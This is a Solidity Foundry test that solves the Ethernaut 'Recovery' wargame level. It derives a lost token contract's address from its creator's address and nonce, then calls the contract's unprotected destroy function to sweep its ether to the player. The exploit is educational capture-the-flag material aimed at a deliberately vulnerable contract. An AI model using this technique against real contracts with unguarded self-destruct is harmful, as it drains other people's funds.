// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/17-Recovery/Recovery.sol";
import "../src/17-Recovery/RecoveryFactory.sol";

contract RecoveryTest is Test {
    Ethernaut ethernaut;
    RecoveryFactory level;
    Recovery instance;
    address player = address(123456);
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new RecoveryFactory();
        ethernaut.registerLevel(level);
        startHoax(player);

        instanceAddress = ethernaut.createLevelInstance{value: 0.001 ether}(
            level
        );
        instance = Recovery(payable(instanceAddress));
    }

    function testRecoveryHack() public {
        uint256 recoveryNonce = vm.getNonce(instanceAddress);
        emit log_named_uint("Recovery contract current nonce:", recoveryNonce);

        // the contract address is deterministically by sender & sender nonce
        uint8 nonce = uint8(recoveryNonce - 1);
        address tokenAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            instanceAddress,
                            nonce
                        )
                    )
                )
            )
        );
        emit log_named_address("Lost address: ", tokenAddress);

        SimpleToken token = SimpleToken(payable(tokenAddress));
        token.destroy(payable(player));

        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
